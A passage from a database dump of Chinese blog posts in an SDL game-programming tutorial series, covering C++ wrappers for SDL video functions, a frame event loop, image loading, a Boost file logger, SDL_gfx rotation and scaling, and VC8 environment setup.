SDL_BlitSurface(src-&gt;value(), srcrect, dst-&gt;value(), dstrect);\r\n	if(ret == -1)\r\n	{\r\n		throw SDLException(std::string(\"SDL_BlitSurface重叠图片时发生错误：\") + SDL_GetError());\r\n	}\r\n\r\n}</code></pre>\r\n\r\n<p>&nbsp; &nbsp;从上面的代码可以看出SDLVideo只是简单的将SDL中video相关的函数做一下包装，检查SDL函数的返回值，如果有错误就抛出异常。在头文件中，将SDL类声明成友元类并且将构造函数设置为private是为了避免在除SDL类以外的地方实例化该类的对象。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 这里用到了SDLSurfacePtr和SDLSurface。SDLSurfacePtr定义：</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">typedef boost::shared_ptr&lt;SDLSurface&gt; SDLSurfacePtr;</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">构造SDLSurfacePtr的代码为：</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">SDLSurfacePtr(new SDLSurface(surface));</code></pre>\r\n\r\n<p>可以看出，SDLSurfacePtr中有SDLSurface，SDLSurface中有SDL_Surface*。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; boost库的shared_ptr是一种带引用计数的智能指针，当shared_ptr对象的引用计数变成0的时候，会自动delete它里面保存的对象，所以当最后一个SDLSurfacePtr对象析构的时候，SDLSurfacePtr会调用delete SDLSurface。关于shared_ptr的详细介绍，可以通过GOOGLE搜到很多资料。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; SDLSurface的析构函数如下：</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">SDLSurface::~SDLSurface()\r\n{\r\n	if(surface != NULL)//surface是SDL_Surface *类型\r\n	{\r\n		SDL_FreeSurface(surface);\r\n	}\r\n}</code></pre>\r\n\r\n<p>由于SDLSurface的析构函数中会调用SDL_Surface*的释放操作。从而使得内存中的SDL_Surface*被自动释放。这样就省去了手动释放SDL_Surface的麻烦。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 最后来看看SDLFrame类</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#ifndef SDLFRAME_H_\r\n#define SDLFRAME_H_\r\n\r\n#include \"SDL/SDLCore.h\"\r\nclass SDLFrame\r\n{\r\npublic:\r\n	static const std::string DEFAULT_TITLE;			//默认窗口标题\r\n	static const int DEFAULT_SCREEN_WIDTH = 800;	//默认窗口宽\r\n	static const int DEFAULT_SCREEN_HEIGHT = 600;	//默认窗口高\r\npublic:\r\n	SDLFrame();\r\n	virtual ~SDLFrame();\r\npublic:\r\n	/*\r\n	 * 打开窗口\r\n	 * flags	窗口模式，见SDL_video.h中的宏定义\r\n	 */\r\n	void 	open(Uint32 flags = SDL_HWSURFACE | SDL_DOUBLEBUF);\r\n\r\n	void 	setTitle(std::string title);\r\n	void 	setSize(int width, int heigth);\r\nprotected:\r\n	/**\r\n	 * 消息处理函数,当有用户输入的时候，框架会调用此函数\r\n	 * event	待处理的消息\r\n	 * return	如果为false，则程序退出\r\n	 */\r\n	virtual	bool onEvent(const SDL_Event *event);\r\n\r\n	/**\r\n	 * 当需要绘制窗口时，框架会调用此函数\r\n	 */\r\n	virtual void onRender();\r\n\r\n	/**\r\n	 * 显示窗口前，框架会调用此函数\r\n	 */\r\n	virtual void onInit();\r\nprotected:\r\n	SDLSurfacePtr screen;\r\n	std::string title;\r\n	int	width;\r\n	int height;\r\n};\r\n\r\n#endif /* SDLFRAME_H_ */</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">源文件：</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#include \"SDLFrame.h\"\r\n\r\nconst std::string SDLFrame::DEFAULT_TITLE  = \"SDL Tutorial\";\r\n\r\nSDLFrame::SDLFrame()\r\n{\r\n	title = DEFAULT_TITLE;\r\n	width = DEFAULT_SCREEN_WIDTH;\r\n	height = DEFAULT_SCREEN_HEIGHT;\r\n}\r\n\r\nSDLFrame::~SDLFrame()\r\n{\r\n	// TODO Auto-generated destructor stub\r\n}\r\n\r\nvoid 	SDLFrame::open(Uint32 flags)\r\n{\r\n	//初始化SDL环境\r\n	SDL::Init(SDL_INIT_EVERYTHING);\r\n\r\n	//设置屏幕模式\r\n	screen = SDL::video()-&gt;SetVideoMode(width, height, 32, flags);\r\n\r\n	//设置窗口标题\r\n	SDL::window()-&gt;SetCaption(title);\r\n\r\n	//初始化\r\n	onInit();\r\n\r\n	//开始事务循环\r\n	SDL_Event event;\r\n	bool bQuit = false;\r\n	while(!bQuit)\r\n	{\r\n		while( SDL::event()-&gt;PollEvent( &amp;event ) )\r\n		{\r\n			if(!onEvent(&amp;event))\r\n			{\r\n				bQuit = true;\r\n			}\r\n		}\r\n\r\n		//绘制\r\n		onRender();\r\n\r\n		//将在内存中的处理结果显示到屏幕上\r\n		SDL::video()-&gt;Flip(screen);\r\n	}\r\n\r\n	//退出SDL环境\r\n	SDL::Quit();\r\n}\r\nvoid 	SDLFrame::setTitle(std::string title)\r\n{\r\n	this-&gt;title = title;\r\n}\r\n\r\nvoid 	SDLFrame::setSize(int width, int heigth)\r\n{\r\n	this-&gt;width = width;\r\n	this-&gt;height = heigth;\r\n}\r\nbool SDLFrame::onEvent(const SDL_Event *event)\r\n{\r\n	switch(event-&gt;type)\r\n	{\r\n	case SDL_KEYDOWN:\r\n		if(event-&gt;key.keysym.sym == SDLK_ESCAPE)\r\n		{\r\n			return false;\r\n		}\r\n		break;\r\n	case SDL_QUIT:\r\n		return false;\r\n		break;\r\n	default:\r\n		break;\r\n	}\r\n\r\n	return true;\r\n}\r\nvoid SDLFrame::onRender()\r\n{\r\n\r\n}\r\nvoid SDLFrame::onInit()\r\n{\r\n\r\n}\r\n</code></pre>\r\n\r\n<p>SDLFrame类封装了消息循环，通过在循环中调用成员函数的方式将消息循环中公共的部分与特殊的部分分离开，从而可以在基类中重载这些成员函数使不同的基类表现出不通的特性。其中onEvent负责处理用户输入，onInit负责窗口创建后的初始化，onRender负责窗口的绘制。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; 这里onEvent只处理了窗口关闭和ESC键按下两个消息，子类可以通过重载来覆盖默认实现。onInit和onRender都是空实现。需要在子类中去实现具体的操作。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; 结合消息循环，现在再回过头去看Lesson01的代码，就会发现只要程序一有空闲，就会调用onRender函数，而Lesson1的onRender函数中只有一行代码：SDL::video()-&gt;BlitSurface(message, NULL, screen, NULL);，并且这行代码中用到的message和screen永远不会变，你可能会想老这样调用同样的代码是不是很浪费资源，在这里确实是浪费资源，其实只要将这行代码放到onInit函数的末尾就可以了。这里可以这样做的原因是因为程序初始化好了之后内存中的内容不再会发生变化，所以每次调用SDL::video()-&gt;Flip(screen)都不会改变屏幕显示的内容。说的通俗点，就是这个程序太简单了，用不着定时去更新窗口。后面的章节中将会看到定时更新窗口的用处。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; 这节的内容就介绍到这里，在以后的章节中，都将采用同Lesson01一样的方式来编写代码。附件中是本节内容的完整源代码。</p>\r\n',0,0,'SDL游戏开发教程04(C++封装SDL)',57,NULL,0),(22,0,'20150613220610',2,'<p>&nbsp;</p>\r\n\r\n<p>&nbsp; &nbsp; 其实就一个地方不同，一个用的是IMG_load函数，一个是SDL_LoadBMP函数。这里将加载图片的函数放到了SDLVideo类中。如果需要加载其他格式的图片调用LoadImage函数就可以了，同时LoadImage也可以加载BMP格式的图片，所以在这里LoadBMP函数基本上没什么用处了。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 我们下一步要做的就是封装一个专门加载图片的类SDLImageManager，用来对加载的图片进行管理，这里主要是对图片进行缓冲，避免频繁的访问硬盘，提高程序效率。头文件：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>其中背景图片是我从网上下载的一张JPG图片，已经将它上传在了附件中。</p>\r\n\r\n<p><span style=\"font-size:medium\"><strong>显示其它格式图片：</strong></span></p>\r\n\r\n<p>要显示png、jpg、gif等格式的图片，我们需要下载SDL_image库</p>\r\n\r\n<p>http://www.libsdl.org/projects/SDL_image/</p>\r\n\r\n<p>下载上图中标记出来的文件，然后解压。</p>\r\n\r\n<p>1、将解压后include目录下的SDL_image.h文件拷贝到C:\\MinGW\\include\\SDL目录下</p>\r\n\r\n<p>2、将解压后include目录下的SDL_image.lib文件拷贝到C:\\MinGW\\lib目录下</p>\r\n\r\n<p>3、将解压后include目录下的所有dll文件拷贝到C:\\MinGW\\bin目录下。（<strong>这个地方直接把对应的dll文件放到工程的根目录即可）</strong></p>\r\n\r\n<p>经过上面的准备，我们可以开始写代码了，其实加载图片的代码很简单。</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">SDLSurfacePtr SDLVideo::LoadImage(std::string fileName)\r\n{\r\n	SDL_Surface *surface = IMG_Load(fileName.c_str());\r\n	if(NULL == surface)\r\n	{\r\n		throw SDLException(std::string(\"IMG_Load加载图片时发生错误：\") + SDL_GetError());\r\n	}\r\n	return SDLSurfacePtr(new SDLSurface(surface));\r\n}</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;通过比较原来加载BMP格式图片的代码</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">SDLSurfacePtr	SDLVideo::LoadBMP(std::string file)\r\n{\r\n	SDL_Surface *surface = SDL_LoadBMP(file.c_str());\r\n	if(NULL == surface)\r\n	{\r\n		throw SDLException(std::string(\"SDL_LoadBMP加载BMP图片时发生错误：\") + SDL_GetError());\r\n	}\r\n\r\n	return SDLSurfacePtr(new SDLSurface(surface));\r\n}</code></pre>\r\n',0,0,'SDL游戏开发教程05(显示文字和其他格式的图片)',50,NULL,0),(23,0,'20150613220652',2,'<p>&nbsp; &nbsp;在利用SDL开发程序时，由于是窗口程序，所以std::cout&lt;&lt;&quot;&quot;&lt;&lt;std::endl都不知道输出到哪里去了。但有时为了跟踪程序的运行状态，需要打印代码运行时的一些信息，这时就需要一个方便使用的日志记录类。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 要在文件中记录日志信息，不可避免的就要读写文件和获取系统时间，遗憾的是C++标准中没有这方面的库。这时就需要使用BOOST库，BOOST中提供了很方便的操作文件和时间的库。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 前面第一节介绍的mingw里面包含了boost1.37，但没有包含编译好的动态库，需要我们自己手工编译，然后放到mingw中来，这里（http://public0821.iteye.com/blog/291163&nbsp;）专门介绍了如何编译和使用boost库。由于我们已经有了boost的头文件，所以不需要它里面介绍的拷贝头文件那一步。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 下面请看日志类的代码：</p>\r\n\r\n<p>Cpp代码&nbsp;&nbsp;<img alt=\"收藏代码\" class=\"star\" src=\"http://public0821.iteye.com/images/icon_star.png\" style=\"border-width:0px\" /></p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"color:black\"><span style=\"color:gray\">#ifndef&nbsp;SDLLOG_H_</span>&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><span style=\"color:gray\">#define&nbsp;SDLLOG_H_</span>&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><span style=\"color:gray\">#include&nbsp;&lt;boost/filesystem.hpp&gt;</span>&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><span style=\"color:gray\">#include&nbsp;&lt;boost/filesystem/fstream.hpp&gt;</span>&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><strong>namespace</strong>&nbsp;fs&nbsp;=&nbsp;boost::filesystem;&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><strong>const</strong>&nbsp;std::string&nbsp;DEFAULT_LOG_FILE&nbsp;=&nbsp;<span style=\"color:blue\">&quot;log.log&quot;</span>;&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><strong>class</strong>&nbsp;SDLLog&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">{&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;<strong>friend</strong>&nbsp;<strong>class</strong>&nbsp;SDL;&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><strong>private</strong>:&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color:rgb(0, 130, 0)\">/**</span>&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><span style=\"color:rgb(0, 130, 0)\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;bAppend&nbsp;&nbsp;程序重启后,写日志时是追加在上次的后面还是先清空文件</span>&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><span style=\"color:rgb(0, 130, 0)\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span>&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;SDLLog(<strong>bool</strong>&nbsp;bAppend&nbsp;=&nbsp;<strong>true</strong>);&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><strong>public</strong>:&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;<strong>virtual</strong>&nbsp;~SDLLog();&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><strong>public</strong>:&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;<strong>void</strong>&nbsp;&nbsp;&nbsp;&nbsp;info(std::string&nbsp;info);&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><strong>private</strong>:&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;fs::ofstream&nbsp;file;&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">};&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><span style=\"color:gray\">#endif&nbsp;/*&nbsp;SDLLOG_H_&nbsp;*/</span>&nbsp;&nbsp;</span></li>\r\n</ol>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span></p>\r\n\r\n<p>Cpp代码&nbsp;&nbsp;<img alt=\"收藏代码\" class=\"star\" src=\"http://public0821.iteye.com/images/icon_star.png\" style=\"border-width:0px\" /></p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"color:black\"><span style=\"color:gray\">#include&nbsp;&quot;SDLLog.h&quot;</span>&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><span style=\"color:gray\">#include&nbsp;&lt;boost/date_time.hpp&gt;</span>&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><strong>using</strong>&nbsp;<strong>namespace</strong>&nbsp;boost::filesystem;&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">SDLLog::SDLLog(<strong>bool</strong>&nbsp;bAppend)&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">{&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;fs::path&nbsp;p(&nbsp;DEFAULT_LOG_FILE);&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;<strong>if</strong>(!bAppend)&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fs::remove(p);&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color:rgb(0, 130, 0)\">//std::ios_base::app表示每次写文件都是追加在后面</span>&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;file.open(p,&nbsp;std::ios_base::app);&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">}&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">SDLLog::~SDLLog()&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">{&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;file.close();&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">}&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\"><strong>void</strong>&nbsp;SDLLog::info(std::string&nbsp;info)&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">{&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;<strong>using</strong>&nbsp;<strong>namespace</strong>&nbsp;boost::posix_time;&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;ptime&nbsp;now&nbsp;=&nbsp;second_clock::local_time();&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;file&nbsp;&lt;&lt;&nbsp;<span style=\"color:blue\">&quot;[INFO]&quot;</span>&nbsp;&lt;&lt;&nbsp;to_iso_extended_string(now.date())&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;&lt;<span style=\"color:blue\">&#39;&nbsp;&#39;</span>&lt;&lt;to_simple_string(now.time_of_day())&nbsp;&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;&lt;<span style=\"color:blue\">&quot;&nbsp;&nbsp;&quot;</span>&lt;&lt;info&nbsp;&lt;&lt;std::endl;&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"color:black\">}&nbsp;&nbsp;</span></li>\r\n</ol>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 代码比较简单，所以这里不做解释。使用时的代码为：SDL::log()-&gt;info(&quot;测试&quot;)；最后写在文件中的日志格式为：[INFO]2008-12-15 19:40:40&nbsp; 测试</p>\r\n',0,0,'SDL游戏开发教程06(利用BOOST库实现简单的文件日志功能)',52,NULL,0),(24,0,'20150613220907',2,'<p>&nbsp; &nbsp;默认的SDL库中没有提供surface的旋转和缩放函数，要实现这些功能，有两种方法，一种是自己写，另一种是找一个支持旋转和缩放的SDL扩展库。很明显，第一种方法不适合我，只能去找一个SDL扩展库。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 通过在SDL网站上搜索，找到了两个库：SpriG和SDL_gfx。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 其中SpriG我试用了他的旋转函数，结果发现旋转后不是少了些东西，就是多点东西，始终不能达到要求，想修改他的源代码，发现代码有些乱，于是放弃了SpriG库。这个过程中也有可能是我的理解或者使用出了问题，在这里将这个库列举出来，是给大家提供一个参考，有能力的话你可以利用他的思想，改进他的代码，使他满足你的要求。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; SDL_gfx的网站http://www.ferzkopp.net/joomla/content/view/19/14/&nbsp;，上面只有源代码，没有编译好的开发库。我试着用网上搜到的办法在mingw+eclipse中编译，但始终不成功，后来通过将源代码加入自己工程的办法实现了surface的旋转和缩放。下面就这个方法进行介绍：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 1、下载源代码，这里下载的是SDL_gfx-2.0.17.tar.gz。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 2、解压，将SDL_rotozoom.h和SDL_rotozoom.c拷贝到当前C++工程的src目录下。这里是拷贝到src\\SDL\\GFX.</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 3、将SDL_rotozoom.h中链接动态库的如下宏代码</p>\r\n\r\n<p>C代码&nbsp;&nbsp;<img alt=\"收藏代码\" class=\"star\" src=\"http://public0821.iteye.com/images/icon_star.png\" style=\"border-width:0px\" /></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#ifdef WIN32  \r\n#ifdef BUILD_DLL  \r\n#define DLLINTERFACE __declspec(dllexport)  \r\n#else  \r\n#define DLLINTERFACE __declspec(dllimport)  \r\n#endif  \r\n#else  \r\n#define DLLINTERFACE  \r\n#endif  </code></pre>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; 替换成</p>\r\n\r\n<p>C代码&nbsp;&nbsp;<img alt=\"收藏代码\" class=\"star\" src=\"http://public0821.iteye.com/images/icon_star.png\" style=\"border-width:0px\" /></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#ifndef DLLINTERFACE  \r\n    #define DLLINTERFACE  \r\n#endif  </code></pre>\r\n\r\n<p>&nbsp; &nbsp; 这样之后就可以用里面的函数了。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在本教程中，我们对他提供的函数进行了封装，类名为SDLTransform，代码如下</p>\r\n\r\n<p>Cpp代码&nbsp;&nbsp;<img alt=\"收藏代码\" class=\"star\" src=\"http://public0821.iteye.com/images/icon_star.png\" style=\"border-width:0px\" /></p>\r\n\r\n<ol start=\"1\">\r\n	<li>\r\n	<pre>\r\n<code class=\"language-cpp\">#ifndef SDLTRANSFORM_H_  \r\n#define SDLTRANSFORM_H_  \r\n#include \"SDLSurface.h\"  \r\nclass SDLTransform  \r\n{  \r\n    friend class SDL;  \r\nprivate:  \r\n    SDLTransform();  \r\npublic:  \r\n    virtual ~SDLTransform();  \r\npublic:  \r\n    /** \r\n     * 旋转图片 \r\n     * src                  源图片 \r\n     * numClockwiseTurns    numClockwiseTurns*90即为旋转的度素 \r\n     * return               旋转后得到的新图片 \r\n     */  \r\n    SDLSurfacePtr   Rotate90Degrees(SDLSurfacePtr src, int numClockwiseTurns);  \r\n  \r\n    /* \r\n     * 缩放图片 \r\n     * src                  源图片 \r\n     * zoomx                X轴缩放倍数 \r\n     * zoomy                Y轴缩放倍数 \r\n     * smooth               暂时不知道啥意思 \r\n     * return               缩放后的图片 \r\n     */  \r\n    SDLSurfacePtr   Zoom( SDLSurfacePtr src, double zoomx, double zoomy, bool smooth = 0);  \r\n};  \r\n  \r\n#endif /* SDLTRANSFORM_H_ */  </code></pre>\r\n\r\n	<p>&nbsp;</p>\r\n	</li>\r\n</ol>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span></p>\r\n\r\n<p>Cpp代码&nbsp;&nbsp;<img alt=\"收藏代码\" class=\"star\" src=\"http://public0821.iteye.com/images/icon_star.png\" style=\"border-width:0px\" /></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#include \"SDLTransform.h\"  \r\n#include \"SDLException.h\"  \r\n#include \"SDLCore.h\"  \r\n#include \"GFX/SDL_rotozoom.h\"  \r\nSDLTransform::SDLTransform()  \r\n{  \r\n    // TODO Auto-generated constructor stub  \r\n  \r\n}  \r\n  \r\nSDLTransform::~SDLTransform()  \r\n{  \r\n    // TODO Auto-generated destructor stub  \r\n}  \r\n  \r\nSDLSurfacePtr SDLTransform::Rotate90Degrees(SDLSurfacePtr src,  \r\n        int numClockwiseTurns)  \r\n{  \r\n        SDL_Surface * surface = rotateSurface90Degrees(src-&gt;value(), numClockwiseTurns);  \r\n        if(surface ==NULL)  \r\n        {  \r\n            throw SDLException(std::string(\"旋转图片失败：\") + SDL_GetError());  \r\n        }  \r\n        return SDLSurfacePtr(new SDLSurface(surface));  \r\n}  \r\n  \r\nSDLSurfacePtr   SDLTransform::Zoom( SDLSurfacePtr src, double zoomx, double zoomy, bool smooth)  \r\n{  \r\n    SDL_Surface * surface = zoomSurface(src-&gt;value(), zoomx, zoomy, smooth);  \r\n    if(surface ==NULL)  \r\n    {  \r\n        throw SDLException(std::string(\"SPG_Scale缩放图片失败：\") + SDL_GetError());  \r\n    }  \r\n    return SDLSurfacePtr(new SDLSurface(surface));  \r\n}  </code></pre>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 这里只封装了两个要用到的函数，别的函数等用到了再封装进来。SDLTransform同前面的其他的封装类一样，只能由SDL类获取对象。下面是调用的示例代码：</p>\r\n\r\n<p>Cpp代码&nbsp;&nbsp;<img alt=\"收藏代码\" class=\"star\" src=\"http://public0821.iteye.com/images/icon_star.png\" style=\"border-width:0px\" /></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#include \"Lesson03.h\"  \r\nLesson03::Lesson03()  \r\n{  \r\n    // TODO Auto-generated constructor stub  \r\n  \r\n}  \r\n  \r\nLesson03::~Lesson03()  \r\n{  \r\n    // TODO Auto-generated destructor stub  \r\n}  \r\n  \r\nvoid Lesson03::onRender()  \r\n{  \r\n    //设置背景为白色  \r\n    SDL_Rect rect;  \r\n    rect.x = 0;  \r\n    rect.y = 0;  \r\n    rect.w = screen-&gt;value()-&gt;w;  \r\n    rect.h = screen-&gt;value()-&gt;h;  \r\n    Uint32 color = SDL::video()-&gt;MapRGB(screen-&gt;value()-&gt;format, 255, 255, 255);  \r\n    SDL::video()-&gt;FillRect(screen, &amp;rect, color);  \r\n  \r\n    //在屏幕中央绘制正常的文字  \r\n    rect.x = screen-&gt;value()-&gt;w/2 - message-&gt;value()-&gt;w/2;  \r\n    rect.y = screen-&gt;value()-&gt;h/2 - message-&gt;value()-&gt;h/2;  \r\n    SDL::video()-&gt;BlitSurface(message, NULL, screen, &amp;rect);  \r\n  \r\n    //在(50,50)的地方绘制旋转90度的文字  \r\n    rect.x = 50;  \r\n    rect.y = 50;  \r\n    SDL::video()-&gt;BlitSurface(message1, NULL, screen, &amp;rect);  \r\n  \r\n    //在(100,100)的地方绘制Y轴方向缩小一半的文字  \r\n    rect.x = 100;  \r\n    rect.y = 100;  \r\n    SDL::video()-&gt;BlitSurface(message2, NULL, screen, &amp;rect);  \r\n}  \r\nvoid Lesson03::onInit()  \r\n{  \r\n    //获取字体  \r\n    SDLFontPtr font = SDL::fontManager()-&gt;OpenFont(\"E:\\\\code_picture\\\\wqy-zenhei.ttc\", 20);  \r\n    font-&gt;SetFontStyle(TTF_STYLE_UNDERLINE | TTF_STYLE_ITALIC);  \r\n  \r\n    //渲染文字  \r\n    message = font-&gt;RenderUNICODEBlended(\"大家好(Hello, Everybody)\", SDL::assistant()-&gt;makeColor(255, 0, 0));  \r\n      \r\n    //旋转90度  \r\n    message1 = SDL::transform()-&gt;Rotate90Degrees(message, 1);  \r\n      \r\n    //X轴大小不变，Y轴缩小一半  \r\n    message2 = SDL::transform()-&gt;Zoom(message, 1, 0.5);  \r\n}  </code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; SDL_gfx还包含了许多其他图形相关的功能，这里不再一一解释（想解释也解释不了，我也是新手），等用到的时候再说。如果有人有兴趣并且有时间，希望能对这个库进行更进一步的研究，然后写几篇文章出来，这样可以让我们深入理解surface的相关转换和处理原理，我也可以不用那么辛苦找资料了<img alt=\"\" src=\"http://public0821.iteye.com/images/smiles/icon_smile.gif\" style=\"border:0px\" />&nbsp;。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 附件中是用到的GFX库源代码，整个工程的完整代码见后面的教程。</p>\r\n',0,0,'SDL游戏开发教程07(图像的旋转和缩放)',57,NULL,0),(25,0,'20150613221143',2,'<p><span style=\"font-size:small\">&nbsp; 本文中将要介绍的是：windows环境下VC8 SP1 + SDL环境的搭建，主要参考lazyfoo.net上的介绍，网址http://lazyfoo.net/SDL_tutorials/lesson01/windows/msvsnet0508e/index.php&nbsp;</span><span style=\"font-size:small\">。该网站上还详细的介绍了其他环境下的配置方法，见http://lazyfoo.net/SDL_tutorials/lesson01/index.php&nbsp;，如果你喜欢用别的环境来做SDL开发，可以参考其中的方法进行配置。</span></p>\r\n\r\n<p>这里介绍VC8环境中SDL的配置是为将代码迁移到VC8中做准备，前面介绍的代码全部都是在eclipse中开发，但最近本人遇到了一点问题，就是eclipse里面调试不了代码，一运行调试就报错，我想可能是gdb for windows的功能还不够完善和稳定，于是决定迁移到VC8中来。</p>\r\n\r\n<p><span style=\"font-size:medium\">SDL安装配置</span></p>\r\n\r\n<p>这里假设VC8的安装目录为D:\\Program Files\\Microsoft Visual Studio 